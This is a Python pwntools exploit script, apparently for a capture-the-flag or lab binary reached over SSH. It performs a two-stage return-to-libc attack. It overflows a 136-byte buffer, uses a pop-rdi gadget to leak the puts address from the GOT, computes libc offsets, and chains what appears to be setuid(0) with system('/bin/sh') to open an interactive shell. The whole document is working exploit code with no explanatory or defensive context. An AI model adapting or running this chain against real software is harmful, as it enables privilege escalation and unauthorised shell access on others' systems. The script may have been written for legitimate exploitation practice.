from pwn import *

remote =  ssh(host='',user='', password='')
p = remote.process('./program')
#p = gdb.debug('./program', 'break main')
context(os="linux",arch='amd64')

#context.log_level = 'DEBUG'
#=================================[ Stage 1 ]================================#
# onbdump -D | grep puts --> GLIBC -->   401050:	ff 25 d2 2f 00 00    	jmpq   *0x2fd2(%rip)        # 404028 <puts@GLIBC_2.2.5>

plt_put = p64(0x401050)
got_put =  p64(0x404028)
plt_main = p64(0x401619)

#edb suche --> rob tool --> pop rdi, ret
pop_rdi =  p64(0x40179b)
junk =  "A" * 136 #offset


#Enter access password: aaaaaa
#access denied.
#Leak current libc Adress:

log.success("Send Stage1")
payload = junk + pop_rdi +  got_put + plt_put +plt_main
p.sendline(payload)
p.recvuntil("denied.")

log.success("Leaking adress")
leaked_puts = p.recv()[:8].strip().ljust(8, "\x00")
log.success("Leaked puts@GLIBC: " + str(leaked_puts))
leaked_puts = u64(leaked_puts)
#s.interactive()

#=================================[ Stage 2 ]================================#
#readelf -s libc.so.6  | grep puts
libc_put = 0x809c0

#readelf -s libc.so.6  | grep system
libc_sys = 0x4f440

#strings -a -t x libc.so.6 | grep /bin/sh
libc_sh =  0x1b3e9a
lib_su =   0xe5970

#offset berechnen:
offset = leaked_puts - libc_put
sys = p64(offset + libc_sys)
sh = p64(offset + libc_sh)

su = p64(offset + lib_su )

payload = junk + pop_rdi + p64(0x0) +su  +pop_rdi   + sh +sys


log.success("Sending Stage2")
p.sendline(payload)
#p.recvuntil("denied.")
p.interactive()
